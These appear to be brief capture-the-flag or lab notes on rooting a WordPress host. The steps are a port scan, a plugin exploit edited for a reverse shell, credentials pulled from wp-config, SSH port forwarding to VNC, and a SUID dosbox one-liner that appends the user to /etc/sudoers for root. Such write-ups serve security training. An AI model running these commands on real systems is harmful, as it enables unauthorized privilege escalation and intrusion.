PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3306/tcp  open  mysql
5000/tcp  open  upnp
13000/tcp open  unknown
36445/tcp open  unknown


simple file list
<img width="674" height="212" alt="image" src="https://github.com/user-attachments/assets/d3e65078-2aec-43d8-9810-b208caa36a8c" />

https://wpscan.com/vulnerability/365da9c5-a8d0-45f6-863c-1b1926ffd574/
edit the payload to put a reverse shell
<img width="814" height="163" alt="image" src="https://github.com/user-attachments/assets/a3d08201-5c72-4afd-8415-0eb985425de5" />
<img width="1585" height="290" alt="image" src="https://github.com/user-attachments/assets/2a026129-3eea-49b4-b481-62c98e930cc2" />

in wpconfig
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'commander' );

/** MySQL database password */
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );

run netstat to find victim is listening to port 5901 on loopback
<img width="1074" height="172" alt="image" src="https://github.com/user-attachments/assets/eafad512-12e3-4c7b-bacd-2f88915cbe6c" />

setup portforwarding
ssh -L 5901:localhost:5901 commander@192.168.154.105

since 5901 is associated with vncviewer
vncviewer 127.0.0.1:5901
<img width="1017" height="756" alt="image" src="https://github.com/user-attachments/assets/638dcd35-9138-426c-97fe-5c14dc5bf298" />

ended up vncviewer was useless lol

suid bit showed dosbox
dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >> C:/etc/sudoers" -c exit
gives commander sudo rights for all

copyfail for root also works

